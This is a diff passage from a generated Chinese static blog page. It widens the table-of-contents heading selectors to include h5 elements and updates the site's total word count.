             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            headingSelector: 'h2, h3, h4,h5'
         });
 
         // modify the toc link href to support Chinese.
@@ -1261,7 +1236,7 @@ print(f&#39;c2 &#x3D; &#123;hex(c2)&#125;&#39;)<span aria-hidden="true" class="l
 
         // modify the heading title id to support Chinese.
         i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
+        $('#articleContent').children('h2, h3, h4,h5').each(function () {
             $(this).attr('id', tocHeading + (++i));
         });
 
@@ -1390,7 +1365,7 @@ print(f&#39;c2 &#x3D; &#123;hex(c2)&#125;&#39;)<span aria-hidden="true" class="l
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">267.7k</span>
+                        class="white-color">259.5k</span>
             
             
             
